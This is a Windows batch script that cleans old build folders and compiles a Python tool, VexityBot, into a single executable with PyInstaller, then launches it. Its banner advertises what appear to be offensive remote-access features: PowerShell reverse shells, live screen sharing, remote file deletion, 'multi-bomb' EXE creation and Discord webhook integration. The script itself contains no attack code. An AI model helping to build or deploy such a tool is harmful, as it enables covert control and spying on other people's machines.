@echo off
setlocal enabledelayedexpansion
echo VexityBot Final Build Script
echo ============================
echo.

echo This will build a clean VexityBot executable with ALL features:
echo - 24 Specialized Bots (including OmegaBot System32 Monitor)
echo - Live Screen Sharing with Multi-User Support
echo - PowerShell Reverse Shells Integration
echo - Pokemon-Style Discord Cards
echo - Admin File Deletion Interface
echo - Create EXE Tab with Multi-Bomb Selection
echo - Screens Tab with User Management
echo.
echo Press any key to continue or Ctrl+C to cancel...
pause >nul

echo.
echo [1/6] Checking Python installation...
python --version >nul 2>&1
if errorlevel 1 (
    echo ERROR: Python is not installed or not in PATH!
    echo Please install Python 3.9+ and try again.
    pause
    exit /b 1
)
echo Python found: 
python --version

echo.
echo [2/6] Checking PyInstaller...
python -c "import PyInstaller" >nul 2>&1
if errorlevel 1 (
    echo ERROR: PyInstaller is not installed!
    echo Installing PyInstaller...
    pip install pyinstaller
    if errorlevel 1 (
        echo ERROR: Failed to install PyInstaller!
        pause
        exit /b 1
    )
)
echo PyInstaller found.

echo.
echo [3/6] Cleaning previous builds...
if exist "build" (
    echo Removing build directory...
    rmdir /s /q "build"
)
if exist "dist" (
    echo Removing dist directory...
    rmdir /s /q "dist"
)
if exist "VexityBot.spec" (
    echo Removing old spec file...
    del "VexityBot.spec"
)
if exist "VexityBot\build" (
    echo Removing VexityBot\build directory...
    rmdir /s /q "VexityBot\build"
)
if exist "VexityBot\dist" (
    echo Removing VexityBot\dist directory...
    rmdir /s /q "VexityBot\dist"
)
if exist "VexityBot\VexityBot.spec" (
    echo Removing VexityBot\VexityBot.spec file...
    del "VexityBot\VexityBot.spec"
)
echo Cleanup completed.

echo.
echo [4/6] Verifying source files...
if not exist "VexityBot\main_gui_only.py" (
    echo ERROR: main_gui_only.py not found!
    echo Please ensure you're running this from the correct directory.
    pause
    exit /b 1
)
if not exist "VexityBot\main_gui.py" (
    echo ERROR: main_gui.py not found!
    echo Please ensure you're running this from the correct directory.
    pause
    exit /b 1
)
echo Source files verified.

echo.
echo [5/6] Building VexityBot executable...
cd VexityBot
echo Running PyInstaller with optimized settings...
python -m PyInstaller --onefile --windowed --name=VexityBot --exclude-module=dnspython --exclude-module=scapy --exclude-module=nmap --exclude-module=cryptography --exclude-module=requests --clean main_gui_only.py

echo.
echo [6/6] Verifying build success...
if exist "dist\VexityBot.exe" (
    echo.
    echo ========================================
    echo           BUILD SUCCESSFUL!
    echo ========================================
    echo.
    echo VexityBot.exe created successfully!
    echo Location: %CD%\dist\VexityBot.exe
    echo.
    echo File details:
    for %%A in ("dist\VexityBot.exe") do (
        echo   Size: %%~zA bytes
        echo   Date: %%~tA
    )
    echo.
    echo Features included:
    echo - 24 Specialized Bots (AlphaBot to OmegaBot)
    echo - System32 Monitor with Pokemon Cards
    echo - Live Screen Sharing (300x300, Multi-User)
    echo - PowerShell Reverse Shells (2 scripts)
    echo - Admin File Deletion Interface
    echo - Create EXE Tab with Multi-Bomb Selection
    echo - Screens Tab with User Management
    echo - Discord Webhook Integration
    echo.
    echo Testing executable launch...
    start "" "dist\VexityBot.exe"
    echo VexityBot launched successfully!
    echo.
    echo Build process completed successfully!
) else (
    echo.
    echo ========================================
    echo            BUILD FAILED!
    echo ========================================
    echo.
    echo ERROR: VexityBot.exe not found!
    echo Check the error messages above for details.
    echo.
    echo Common issues:
    echo - Missing Python dependencies
    echo - Syntax errors in source code
    echo - Insufficient disk space
    echo - Antivirus blocking the build
    echo.
    echo Please fix the issues and try again.
)

echo.
echo Press any key to exit...
pause >nul
